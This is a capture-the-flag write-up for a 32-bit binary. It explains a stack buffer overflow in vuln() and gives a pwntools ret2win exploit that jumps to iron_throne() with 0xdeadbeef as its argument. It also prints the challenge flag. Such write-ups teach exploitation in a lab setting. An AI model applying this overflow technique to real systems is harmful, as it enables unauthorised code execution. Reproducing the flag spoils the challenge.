  A 32bit binary has been given.

  #### Decompilation 

  Looking at the **vuln()** function..

  We see there an scope of an buffer overflow as we can see that the **read()** function can take an input with a more input length(0x54) than the allocated memory(0x2c). 

  If we read the challenge description it is pretty clear that we have to find the iron throne. 
  And while decompiling/debugging we see an `iron_throne()` function.

  Aahaa !! 

  We see that this `iron_throne()` is called with a parameter which is later checked to a number = `-0x2152411` which translates as `0xdeadbeef` 

  And then we are supposed to get the flag with `system("cat flag.txt")`

  #### Crafting the exploit 

  `payload = b'a'*44`  as the required buffer 
  `payload += b'x'*12` as padding required to reach the eip 
  `payload += p32(elf.symbols["iron_throne"])` adding the address of the `iron_throne()`
  `payload += p32(0xdeadbeef)+p32(0xdeadbeef)` the parameter of the function `iron_throne()` and the return address. 

  #### The final exploit 

  ```from pwn import *

  elf = ELF("./chall")
  context.binary = elf
  #p = process("./chall")
  host = os.environ['CI_REGISTRY_IMAGE'].replace('/', '-')
  p = remote(host, 9007)

  p.sendline("A"*56+p32(elf.symbols["iron_throne"])+p32(0xdeadbeef)+p32(0xdeadbeef))
  p.interactive()
  ```
  **Flag** = inctfj{t4rga3ry4n5_4lw4ys_p4ys_th3ir_d3b1s_2refwh2138uh}
